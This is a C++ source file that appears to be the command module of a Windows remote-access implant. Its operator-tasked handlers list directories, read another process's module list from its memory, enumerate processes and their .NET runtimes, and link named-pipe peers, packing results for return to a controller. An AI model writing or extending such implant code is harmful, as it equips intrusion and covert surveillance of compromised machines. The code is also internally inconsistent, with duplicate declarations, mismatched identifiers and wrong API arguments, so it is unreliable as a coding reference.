#include <core/include/commands.hpp>

namespace Commands {
    HASH_MAP RDATA_SX cmd_map[] = {
        { .name = DIRECTORYLIST, 	.address = (VOID*) Commands::DirectoryList        	},
        { .name = PROCESSMODULES,   .address = (VOID*) Commands::ProcessModules       	},
        { .name = PROCESSLIST,	    .address = (VOID*) Commands::ProcessList          	},
        { .name = ADDPEER,		    .address = (VOID*) Commands::CommandAddPeer       	},
        { .name = REMOVEPEER,		.address = (VOID*) Commands::CommandRemovePeer    	},
        { .name = SHUTDOWN,		    .address = (VOID*) Commands::Shutdown             	},
        { .name = 0,				.address = nullptr		                        	},
    };

    VOID DirectoryList (PARSER* parser) {
        PACKET *outPack = CreateTaskResponse(DIRECTORYLIST);

        ULONG size = 0;
        HANDLE handle = nullptr;

        WIN32_FIND_DATAA head 	= { };
        ULARGE_INTEGER fileSize	= { };
        SYSTEMTIME accessTime 	= { };
        SYSTEMTIME sysTime 		= { };

        const auto dirString = UnpackString(parser, nullptr);
        const auto pathBuffer = (CHAR*) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, MAX_PATH);

        if (dirString[0] == PERIOD) {
            if (!(size = Ctx->Win32.GetCurrentDirectoryA(MAX_PATH, pathBuffer))) {
                // LOG ERROR
                goto defer;
            }

            if (pathBuffer[size - 1] != BSLASH) {
                pathBuffer[size++] = BSLASH;
            }

            pathBuffer[size++] = ASTER;
            pathBuffer[size] = NULTERM;
        }
        else {
            MemCopy(pathBuffer, dirString, MAX_PATH);
        }

        if ((handle = ctx->win32.FindFirstFileA(pathBuffer, &head))) {
            do {
                if (!Ctx->Win32.FileTimeToSystemTime(&head.ftLastAccessTime, &accessTime) ||
                    !Ctx->Win32.SystemTimeToTzSpecificLocalTime(nullptr, &accessTime, &sysTime)) {
                    // LOG ERROR
                    goto defer;
                }

                if (head.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    PackUint32(outPack, TRUE);
                } else {
                    fileSize.HighPart   = head.nFileSizeHigh;
                    fileSize.LowPart    = head.nFileSizeLow;

                    PackUint32(outPack, FALSE);
                    PackUint64(outPack, fileSize.QuadPart);
                }

                PackUint32(outPack, accessTime.wMonth);
                PackUint32(outPack, accessTime.wDay);
                PackUint32(outPack, accessTime.wYear);
                PackUint32(outPack, sysTime.wHour);
                PackUint32(outPack, sysTime.wMinute);
                PackUint32(outPack, sysTime.wSecond);
                PackString(outPack, head.cFileName);
            }
            while (Ctx->Win32.FindNextFileA(handle, &head) != 0);
        }
        else {
            // LOG ERROR
            goto defer;
        }

        MessageQueue(outPack);
defer:
        if (handle) {
            ctx->win32.FindClose(handle);
        }
        if (pathBuffer) {
            Ctx->Win32.RtlFreeHeap(Ctx->Heap, 0, pathBuffer);
        }
    }

    VOID ProcessModules (PARSER *parser) {
        PACKET *outPack = CreateTaskResponse(PROCESSMODULES);
		NTSTATUS ntstatus = 0;

        LDR_DATA_TABLE_ENTRY mod = { };
        PROCESS_BASIC_INFORMATION pbi = { };

        PPEB_LDR_DATA loads = nullptr;
        PLIST_ENTRY head = nullptr;
        PLIST_ENTRY entry = nullptr;
        HANDLE process = nullptr;

        CHAR modNameA[MAX_PATH] = { };
        WCHAR modNameW[MAX_PATH] = { };

        UINT32 pid = 0;
        UINT32 count = 0;
        SIZE_T size = 0;
		NTSTATUS ntstatus = 0;

        pid = GetProcessIdByName(UnpackString(parser, nullptr));
		if (!pid) {
			// log error
			return;
		}
		// NOTE: capture ntstatus for dbg
        if (!NT_SUCCESS(ntstatus = NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, pid))) {
			// log error
			return;
		}
        if (!NT_SUCCESS(ntstatus = Ctx->Win32.NtQueryInformationProcess(process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), nullptr))) {
			// log error
			return;
		}
        if (!NT_SUCCESS(ntstatus = Ctx->Win32.NtReadVirtualMemory(process, &pbi.PebBaseAddress->Ldr, &loads, sizeof(PLDR_DATA_TABLE_ENTRY), &size))) {
			// log error
			return;
		}
        if (!NT_SUCCESS(ntstatus = Ctx->Win32.NtReadVirtualMemory(process, &loads->InMemoryOrderModuleList.Flink, &entry, sizeof(PLIST_ENTRY), nullptr))) {
			// log error
			return;
		}

        for (head = &loads->InMemoryOrderModuleList; entry != head; entry = mod.InMemoryOrderLinks.Flink) {
            if (!NT_SUCCESS(ntstatus = Ctx->win32.NtReadVirtualMemory(process, CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &mod, sizeof(LDR_DATA_TABLE_ENTRY), nullptr))) {
				// log error
				return;
			}
            if (!NT_SUCCESS(ntstatus = Ctx->Win32.NtReadVirtualMemory(process, mod.FullDllName.Buffer, &modNameW, mod.FullDllName.Length, &size))) {
				// log error
				return;
			}
            if (size != mod.FullDllName.Length) {
				// log error
				return;
			}

            if (mod.FullDllName.Length > 0) {
                size = WcsToMbs(modNameA, modNameW, mod.FullDllName.Length);

                PackString(outPack, modNameA);
                PackPointer(outPack, mod.DllBase);
                count++;
            }

            MemSet(modNameW, 0, MAX_PATH);
            MemSet(modNameA, 0, MAX_PATH);
        }

        MessageQueue(outPack);
    }

    VOID ProcessList() {
        PACKET *outPack = CreateTaskResponse(PROCESSLIST);
        PROCESSENTRY32 entries = { };

        HANDLE snapshot = nullptr;
        HANDLE process = nullptr;

        IEnumUnknown *enums = nullptr;
        ICLRMetaHost *meta = nullptr;
        ICLRRuntimeInfo *runtime = nullptr;

        WCHAR buffer[1024] = { };
        DWORD size = 0;

        size            = ARRAY_LEN(buffer);
        entries.dwSize  = sizeof(PROCESSENTRY32);

        snapshot = Ctx->Win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (!snapshot) {
			// log error
			return;
		}
        if (!Ctx->Win32.Process32First(snapshot, &entries)) {
			// log error
			return;
		}
        do {
            CLIENT_ID cid= { };
            cid.UniqueThread = nullptr;
            cid.UniqueProcess = (void*) entries.th32ProcessID;

            BOOL is_managed = false;
            BOOL is_loaded = false;
			NTSTATUS ntstatus = 0;

            OBJECT_ATTRIBUTES attr = { };
            InitializeObjectAttributes(&attr, nullptr, 0, nullptr, nullptr);

            if (!NT_SUCCESS(ntstatus = Ctx->Win32.NtOpenProcess(&process, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &attr, &cid))) {
				// log error
				return;
			}
            if (!NT_SUCCESS(ntstatus = Ctx->Win32.CLRCreateInstance(X_GUID_CLSID_CLRMetaHost, X_GUID_IID_ICLRMetaHost, (void**) &meta))) {
				// log error
				return;
			}
            if (!NT_SUCCESS(ntstatus = meta->lpVtbl->EnumerateInstalledRuntimes(meta, &enums))) {
				// log error
				return;
			}

            while (S_OK == enums->Next(0x1, (IUnknown**) &runtime, nullptr)) {
                if (runtime->lpVtbl->IsLoaded(runtime, process, &is_loaded) == S_OK && is_loaded == TRUE) {

                    is_managed = true;
                    if (SUCCEEDED(runtime->lpVtbl->GetVersionString(runtime, buffer, &size))) {
                        PackUint32(outPack, entries.th32ProcessID);
                        PackString(outPack, entries.szExeFile);
                        PackWString(outPack, buffer);
                    }
                }
                runtime->lpVtbl->Release(runtime);
            }

            if (!is_managed) {
                PackUint32(outPack, entries.th32ProcessID);
                PackString(outPack, entries.szExeFile);
                PackWString(outPack, nullptr);
            }

            if (process) {
                Ctx->Win32.NtClose(process);
            }
            if (meta) {
                meta->lpVtbl->Release(meta);
            }
            if (runtime) {
                runtime->lpVtbl->Release(runtime);
            }
            if (enums) {
                enums->Release();
            }
        }
        while (Ctx->Win32.Process32Next(snapshot, &entries));
        MessageQueue(outPack);

defer:
        if (snapshot) {
            Ctx->Win32.NtClose(snapshot);
        }
    }

    VOID CommandAddPeer(PARSER *parser) {
        auto pipeName = UnpackWString(parser, nullptr);
        auto peerId = UnpackUint32(parser);

        AddPeer(pipeName, peerId);
    }

    VOID CommandRemovePeer(PARSER *parser) {
        auto peerId = UnpackUint32(parser);
        RemovePeer(peerId);
    }

    VOID Shutdown(PARSER *parser) {
        // Send final message
        // Zero/Free all memory
        // Exit
        ntstatus = ERROR_EXIT;
    }

    UINT_PTR FindCommandAddress(CONST UINT32 nameId) {
        for (UINT32 i = 0 ;; i++) {
            if (!cmdMap[i].name) {
                return 0;
            }

            if (cmdMap[i].name == nameId) {
                return (UINT_PTR)(cmdMap[i].address);
            }
        }
    }
}
